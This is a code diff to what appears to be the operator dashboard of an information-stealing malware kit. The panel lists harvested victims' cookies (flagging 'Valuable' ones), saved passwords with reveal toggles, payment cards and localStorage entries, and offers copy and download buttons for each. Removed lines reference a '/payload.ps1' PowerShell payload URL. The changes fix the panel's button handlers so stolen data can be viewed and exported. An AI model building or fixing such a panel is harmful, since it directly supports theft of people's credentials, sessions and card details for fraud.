@@ -10,8 +10,6 @@
         // AUTO-DETECT BASE URL — NO MANUAL EDITING NEEDED
         // ============================================================
         const BASE_URL = window.location.origin;
-        const PAYLOAD_URL = BASE_URL + '/payload.ps1';
-        const HOME_URL = BASE_URL + '/home';
 
         (function() {
             document.addEventListener('keydown', function(e) {
@@ -3891,7 +3889,7 @@
         }
 
         // ============================================================
-        // MODAL
+        // MODAL — FIXED WITH WORKING EYE, COPY, DOWNLOAD BUTTONS
         // ============================================================
 
         function openModalForEntry(uniqueId) {
@@ -3985,16 +3983,15 @@
                         <div class="section-title">🍪 Cookies (${cookieEntries.length})</div>
                         ${cookieEntries.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cookies</div>' : ''}
                         ${cookieEntries.map(([name, value]) => {
-                            const valuable = isValuable(name);
                             const escaped = value.replace(/'/g, "\\'");
                             return `
                                 <div class="data-item">
                                     <span class="label">${name}</span>
                                     <span class="value" title="${value}">${value.length > 50 ? value.slice(0,50)+'...' : value}</span>
-                                    ${valuable ? '<span class="badge-valuable">Valuable</span>' : ''}
+                                    ${isValuable(name) ? '<span class="badge-valuable">Valuable</span>' : ''}
                                     <div class="actions">
-                                        <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
-                                        <button class="btn-icon-sm download" onclick="downloadItem('${name}', '${escaped}', 'cookie')">⬇️</button>
+                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'cookie')">⬇️</button>
                                     </div>
                                 </div>
                             `;
@@ -4017,16 +4014,17 @@
                             const isVisible = passwordVisibility[visKey] || false;
                             if (!value || value === '' || value === 'undefined' || value === 'null') return '';
                             const displayUrl = url && url !== 'https://' ? url : 'https://' + domain;
+                            const displayValue = isVisible ? value : value.replace(/./g, '•');
                             return `
                                 <div class="data-item">
                                     <span class="label" style="color:#ec4899;">${name}</span>
-                                    <span class="value ${isVisible ? '' : 'password-hidden'}" id="${visKey}-val">${isVisible ? value : value.replace(/./g, '•')}</span>
+                                    <span class="value ${isVisible ? '' : 'password-hidden'}" id="${visKey}-val">${displayValue}</span>
                                     <span class="badge-type">${type}</span>
                                     <a href="${displayUrl}" target="_blank" class="link">🔗 ${displayUrl.length > 30 ? displayUrl.slice(0,30)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a>
                                     <div class="actions">
-                                        <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
-                                        <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
-                                        <button class="btn-icon-sm download" onclick="downloadItem('${name}', '${escaped}', 'credential')">⬇️</button>
+                                        <button class="btn-icon-sm eye" onclick="window.togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
+                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'credential')">⬇️</button>
                                     </div>
                                 </div>
                             `;
@@ -4060,9 +4058,9 @@
                                     <span class="badge-type">${type}</span>
                                     <a href="${displayUrl}" target="_blank" class="link">🔗 ${displayUrl.length > 30 ? displayUrl.slice(0,30)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a>
                                     <div class="actions">
-                                        <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
-                                        <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
-                                        <button class="btn-icon-sm download" onclick="downloadItem('${name}', '${escaped}', 'card')">⬇️</button>
+                                        <button class="btn-icon-sm eye" onclick="window.togglePasswordVis('${visKey}', '${visKey}-val')">👁️</button>
+                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${name}', '${escaped}', 'card')">⬇️</button>
                                     </div>
                                 </div>
                             `;
@@ -4087,8 +4085,8 @@
                                     <span class="value" title="${value}">${value.length > 50 ? value.slice(0,50)+'...' : value}</span>
                                     <span class="badge-storage">${browserLabel}</span>
                                     <div class="actions">
-                                        <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
-                                        <button class="btn-icon-sm download" onclick="downloadItem('${cleanKey}', '${escaped}', 'localstorage')">⬇️</button>
+                                        <button class="btn-icon-sm copy" onclick="window.copyText('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="window.downloadItem('${cleanKey}', '${escaped}', 'localstorage')">⬇️</button>
                                     </div>
                                 </div>
                             `;
@@ -4329,10 +4327,10 @@
         }
 
         // ============================================================
-        // COPY & DOWNLOAD HELPERS
+        // COPY & DOWNLOAD HELPERS — GLOBAL FUNCTIONS
         // ============================================================
 
-        function copyText(text) {
+        window.copyText = function(text) {
             navigator.clipboard.writeText(text).then(() => {
                 showToast('✅ Copied!', 'success');
             }).catch(() => {
@@ -4348,7 +4346,7 @@
             });
         }
 
-        function downloadItem(name, value, type) {
+        window.downloadItem = function(name, value, type) {
             const data = { name: name, value: value, type: type, exportedAt: new Date().toISOString() };
             const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
@@ -4363,7 +4361,7 @@
             showToast(`📥 ${type} downloaded`, 'success');
         }
 
-        function togglePasswordVis(key, elementId) {
+        window.togglePasswordVis = function(key, elementId) {
             passwordVisibility[key] = !passwordVisibility[key];
             const el = document.getElementById(elementId);
             if (el) {
